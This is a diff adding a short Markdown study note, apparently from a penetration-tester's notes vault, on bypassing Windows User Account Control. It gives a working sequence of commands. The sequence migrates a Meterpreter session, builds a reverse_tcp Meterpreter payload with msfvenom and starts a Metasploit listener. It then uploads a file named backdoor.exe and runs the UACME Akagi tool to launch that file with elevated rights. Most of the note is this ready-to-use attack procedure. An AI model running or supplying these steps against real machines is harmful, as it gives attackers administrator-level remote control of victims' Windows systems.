@@ -1,0 +1,85 @@
+
+User Account Control, related to [[Privilege Escalation]]
+
+It's a very efficient privilege scalation vector.
+
+We will need a user that is part of the local windows administrators
+
+https://github.com/hfiref0x/UACME
+
+We can check the admin groups:
+
+``` bash
+net localgroup administrators
+```
+
+The UAC by default isnt on the highest setting,we can change it with the UAC panel.
+
+Once we have an initial session we can search processes using
+
+``` bash
+pgrep [name]
+```
+
+For example if we want to use a x64 architecture we can use
+
+``` bash
+pgrep explorer
+migrate [STDOUT of previous]
+```
+
+We can see who we are and our pivileges with 
+
+``` bash
+getuid
+getprivs
+```
+
+Then we can use 
+
+``` bash
+shell
+```
+
+To spawn a shell and with
+
+``` bash
+net user
+```
+
+enumerate all users
+
+Once we verify we are part of local administrators we need to bypass UAC because we cannot click the consent form from a shell
+
+We can use either Akagi32 or Akagi64 depending on our architecture
+
+We also need to setup a msfvenom payload
+
+``` bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=[lIP] LPORT=[lPORT] -f exe > [outputfilename].exe
+```
+
+Then in [[Metasploit]]
+
+``` bash
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOSTS [lIP]
+set LPORT [lPORT]
+run
+```
+
+To start the listener.
+
+Then back at the meterpreter session:
+
+``` bash
+cd C:\\
+mkdir Temp
+cd Temp
+upload backdoor.exe
+upload /root/Desktop/tools/UACME/Akagi[v].exe
+shell
+.\Akagi[v].exe [Key (23)] [backdoorpath (C:\Temp\backdoor.exe)]
+```
+
